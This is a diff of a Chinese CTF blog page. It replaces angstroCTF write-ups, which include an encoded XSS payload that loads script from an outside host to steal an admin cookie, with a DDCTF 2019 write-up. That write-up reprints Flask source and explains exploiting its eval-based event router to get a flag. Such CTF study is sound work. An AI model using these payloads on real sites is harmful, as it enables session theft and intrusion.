@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>angstroCTF Web+Misc | 过客</title>	
+<title>[DDCTF 2019]homebrew event loop | 过客</title>	
 
 <link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
 <script type="text/javascript">
@@ -150,10 +150,10 @@ window.onload=getCSS();
 	
 	                      
 		<div class="entry-content">
-			<h1 class="wow swing entry-title">angstroCTF Web+Misc</h1>
+			<h1 class="wow swing entry-title">[DDCTF 2019]homebrew event loop</h1>
 <div class="entry-meta">
 <div class="wow bounce">
-	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-15 10:51:17" itemprop="datePublished" pubdate="">2020-03-15</time></i>
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-17 09:54:34" itemprop="datePublished" pubdate="">2020-03-17</time></i>
 	          </div>
 			
 </span>
@@ -161,108 +161,203 @@ window.onload=getCSS();
 		</div>
                   
 			<div class="wow slideInLeft entry-summary song">
-				<p>ws1:<br>
-追踪TCP流得到Flag<br>
-<img src="https://guokeya.github.io/post-images/1584240752587.png" alt="" loading="lazy"><br>
-ws2:<br>
-HTTP流。导出JPG得到Flag<br>
-<img src="https://guokeya.github.io/post-images/1584240943390.png" alt="" loading="lazy"><br>
-inputter:<br>
-源码如下</p>
-<pre><code>#define _GNU_SOURCE
+				<p>题目给出了源码。并且有购买points功能。其他没了<br>
+首先审计代码。删了部分代码</p>
+<pre><code>from flask import Flask, session, request, Response
+import urllib
 
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;unistd.h&gt;
+def trigger_event(event):
+    session['log'].append(event)
+    if len(session['log']) &gt; 5:
+        session['log'] = session['log'][-5:]
+    if type(event) == type([]):
+        request.event_queue += event
+    else:
+        request.event_queue.append(event)
 
-#define FLAGSIZE 128
 
-void print_flag() {
-    gid_t gid = getegid();
-    setresgid(gid, gid, gid);
-    FILE *file = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
-    char flag[FLAGSIZE];
-    if (file == NULL) {
-        printf(&quot;Cannot read flag file.\n&quot;);
-        exit(1);
-    }
-    fgets(flag, FLAGSIZE, file);
-    printf(&quot;%s&quot;, flag);
-}
+def get_mid_str(haystack, prefix, postfix=None):
+    haystack = haystack[haystack.find(prefix)+len(prefix):]
+    if postfix is not None:
+        haystack = haystack[:haystack.find(postfix)]
+    return haystack
 
-int main(int argc, char* argv[]) {
-    setvbuf(stdout, NULL, _IONBF, 0);
-    if (argc != 2) {
-        puts(&quot;Your argument count isn't right.&quot;);
-        return 1;
-    }
-    if (strcmp(argv[1], &quot; \n'\&quot;\x07&quot;)) {
-        puts(&quot;Your argument isn't right.&quot;);
-        return 1;
-    }
-    char buf[128];
-    fgets(buf, 128, stdin);
-    if (strcmp(buf, &quot;\x00\x01\x02\x03\n&quot;)) {
-        puts(&quot;Your input isn't right.&quot;);
-        return 1;
-    }
-    puts(&quot;You seem to know what you're doing.&quot;);
-    print_flag();
-}
+
+class RollBackException:
+    pass
+
+
+def execute_event_loop():
+    valid_event_chars = set(
+        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#')
+    resp = None
+    while len(request.event_queue) &gt; 0:
+        # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;
+        event = request.event_queue[0]
+        request.event_queue = request.event_queue[1:]
+        if not event.startswith(('action:', 'func:')):
+            continue
+        for c in event:
+            if c not in valid_event_chars:
+                break
+        else:
+            is_action = event[0] == 'a'
+            action = get_mid_str(event, ':', ';')
+            args = get_mid_str(event, action+';').split('#')
+            try:
+                event_handler = eval(
+                    action + ('_handler' if is_action else '_function'))
+                ret_val = event_handler(args)
+            except RollBackException:
+                if resp is None:
+                    resp = ''
+                resp += 'ERROR! All transactions have been cancelled. &lt;br /&gt;'
+                resp += '&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'
+                session['num_items'] = request.prev_session['num_items']
+                session['points'] = request.prev_session['points']
+                break
+            except Exception, e:
+                if resp is None:
+                    resp = ''
+                # resp += str(e) # only for debugging
+                continue
+            if ret_val is not None:
+                if resp is None:
+                    resp = ret_val
+                else:
+                    resp += ret_val
+    if resp is None or resp == '':
+        resp = ('404 NOT FOUND', 404)
+    session.modified = True
+    return resp
+
+
+
+def view_handler(args):
+    page = args[0]
+    html = ''
+    html += '[INFO] you have {} diamonds, {} points now.&lt;br /&gt;'.format(
+        session['num_items'], session['points'])
+    if page == 'index':
+        html += '&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;'
+        html += '&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'
+        html += '&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;'
+    elif page == 'shop':
+        html += '&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'
+    elif page == 'reset':
+        del session['num_items']
+        html += 'Session reset.&lt;br /&gt;'
+    html += '&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'
+    return html
+
+
+def index_handler(args):
+    bool_show_source = str(args[0])
+    bool_download_source = str(args[1])
+    if bool_show_source == 'True':
+
+        source = open('eventLoop.py', 'r')
+        html = ''
+        if bool_download_source != 'True':
+            html += '&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'
+            html += '&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'
+
+        for line in source:
+            if bool_download_source != 'True':
+                html += line.replace('&amp;', '&amp;amp;').replace('\t', '&amp;nbsp;'*4).replace(
+                    ' ', '&amp;nbsp;').replace('&lt;', '&amp;lt;').replace('&gt;', '&amp;gt;').replace('\n', '&lt;br /&gt;')
+            else:
+                html += line
+        source.close()
+
+        if bool_download_source == 'True':
+            headers = {}
+            headers['Content-Type'] = 'text/plain'
+            headers['Content-Disposition'] = 'attachment; filename=serve.py'
+            return Response(html, headers=headers)
+        else:
+            return html
+    else:
+        trigger_event('action:view;index')
+
+
+def buy_handler(args):
+    num_items = int(args[0])
+    if num_items &lt;= 0:
+        return 'invalid number({}) of diamonds to buy&lt;br /&gt;'.format(args[0])
+    session['num_items'] += num_items
+    trigger_event(['func:consume_point;{}'.format(
+        num_items), 'action:view;index'])
+
+
+def consume_point_function(args):
+    point_to_consume = int(args[0])
+    if session['points'] &lt; point_to_consume:
+        raise RollBackException()
+    session['points'] -= point_to_consume
+
+
+
+def get_flag_handler(args):
+    if session['num_items'] &gt;= 5:
+        # show_flag_function has been disabled, no worries
+        trigger_event('func:show_flag;' + FLAG())
+    trigger_event('action:view;index')
+
 </code></pre>
-<p>只要第一个参数为空格换行'&quot;\x07。第二个参数为\x00010203\n<br>
-a.py:</p>
-<pre><code>print &quot; \n'\&quot;\x07&quot;
-</code></pre>
-<p>b.py:</p>
-<pre><code>print &quot;\x00\x01\x02\x03\n&quot;
-</code></pre>
-<pre><code>python b.py|./inpuuter `python a.py`
-</code></pre>
-<p>得到flag</p>
-<p>ws3:<br>
-是一个git-pack的流量。首先wireshark分离出来<br>
-有一个git-receive-pack文件18KB.其他就1KB.<br>
-继续对此文件分离，得到Flag<br>
-<img src="https://guokeya.github.io/post-images/1584241829597.png" alt="" loading="lazy"></p>
-<p>clam clam clam:<br>
-输入两次clam clam clam得到Flag<br>
-不知道为啥。</p>
-<p>The Magic Word:<br>
-右键查看源码<br>
-<img src="https://guokeya.github.io/post-images/1584241879497.png" alt="" loading="lazy"><br>
-magic的值等于please give flag就能拿到flag。HTML改一下就行<br>
-<img src="https://guokeya.github.io/post-images/1584241931632.png" alt="" loading="lazy"></p>
-<p>Xmas Still Stands:<br>
-XSS。直接给烨师傅的payload</p>
-<pre><code>&lt;img src=x onerror=eval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzeWUuY29tL3lleWV5ZT8nK01hdGgucmFuZG9tKCk='))&gt;
-</code></pre>
-<p>得到管理员cookie后。拿到flag</p>
-<p>Consolation:<br>
-<img src="https://guokeya.github.io/post-images/1584242031985.png" alt="" loading="lazy"></p>
-<p>Git Good:<br>
-githacker下来后git log --reflog<br>
-<img src="https://guokeya.github.io/post-images/1584242219800.png" alt="" loading="lazy"></p>
-<p>Secret Agents:<br>
-题目给出了源码<br>
-毫无过滤就带入sql语句。<br>
-<img src="https://guokeya.github.io/post-images/1584242265678.png" alt="" loading="lazy"><br>
-ua头sqlmap跑以下就行</p>
+<p>execute_event_loop是起到路由功能。对URL中参数进行分割等。然后执行对应的函数<br>
+我们可以复制下来。本地跑下<br>
+<img src="https://guokeya.github.io/post-images/1584421017668.png" alt="" loading="lazy"><br>
+接着我们看下得到flag的地方。<br>
+<img src="https://guokeya.github.io/post-images/1584421073491.png" alt="" loading="lazy"><br>
+如果session[num_items]&gt;=5。就会调用了trigger_event。接着看看这个函数是干啥的<br>
+将要执行的函数和参数。放入request的队列中。然后依次执行<br>
+<img src="https://guokeya.github.io/post-images/1584421381212.png" alt="" loading="lazy"><br>
+也就是说。我们要满足session[num_items]=5。继续看num_items在哪可以加<br>
+<img src="https://guokeya.github.io/post-images/1584421627465.png" alt="" loading="lazy"><br>
+以buy_handler(1)这样购买。然后num_item就会+1<br>
+会把func:consume_point;num_items传入队列执行<br>
+执行的是consume_point_function(num_items)<br>
+<img src="https://guokeya.github.io/post-images/1584421792842.png" alt="" loading="lazy"><br>
+作用是判断session中的points是否小于我们想要购买的数量。如果小于。那么就再减掉<br>
+就是。我们购买5个flag。但是。只有3个金币。它会先购买5个。然后判断钱是不是够。不够就再减去<br>
+OK。现在大致思路就搞懂了。execute_event_loop函数。接受输入。决定执行什么函数。<br>
+执行函数时。会把函数加入队列。然后再从队列中取出按顺序执行<br>
+如果我们直接调用buy_flag(5)。先将buy_flag(5)执行。然后再执行判断。如果钱不够就会减掉。<br>
+我们再执行。get_flag的时候。就失败。。<br>
+得在buy_flag(5)后。get_flag<br>
+仔细看看execute_event_loop函数处理路由的过程：<br>
+action(函数名)是第一个冒号后面的值。然后截取出来的字符串。再截取分号前面的值<br>
+<img src="https://guokeya.github.io/post-images/1584423199385.png" alt="" loading="lazy"><br>
+参数呢。也是通过分割得到的。<br>
+取函数名+分号后面的值。用#来分割。作为参数<br>
+<img src="https://guokeya.github.io/post-images/1584423317572.png" alt="" loading="lazy"><br>
+重复写。就能构造一个参数。<br>
+然后带入eval执行。。由于他是用#来注释。那么#用于注释python的代码eval('func:456#123')<br>
+井号会注释掉123<br>
+这里我们可以调用任意函数。那么我们直接调用trigger_event。event传参。为两个函数名和参数。加入队列。由于execute_event_loop还会对队列中的参数进行处理。我们直接传actionxx这种格式就好了<br>
+<code>例如event(['action:buy:5'],'action:get_flag')</code><br>
+这样我们就能买5个num_items。然后再调用get_flag。注意此时队列中顺序如下。<br>
+buy:5<br>
+get_flag<br>
+buy:5触发的consume_point_function函数。<br>
+<img src="https://guokeya.github.io/post-images/1584424534870.png" alt="" loading="lazy"><br>
+得到session。用flask_session_manager解密即可</p>
 
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
  
+				<a href="https://guokeya.github.io/tag/CTF/" rel="tag">CTF</a>	
+				 
+				<a href="https://guokeya.github.io/tag/Web/" rel="tag">Web安全</a>	
+				 
 					</div>						
 <nav class="navigation3 post-navigation3" role="navigation">
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://guokeya.github.io/post/gW7Qnkxsi/" rel="prev"> [网鼎杯2018]Unfinish(二次注入)</a></div>
 		 
-		 
-		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/MzHF-GZP0/" rel="next"> [SWPU2019]Web4(堆叠注入+Thinkphp审计)</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/lClpsRDJm/" rel="next"> Wallbreaker_Easy(Bypass disable_function)</a></div>
 		
 		</div>
 	</nav>
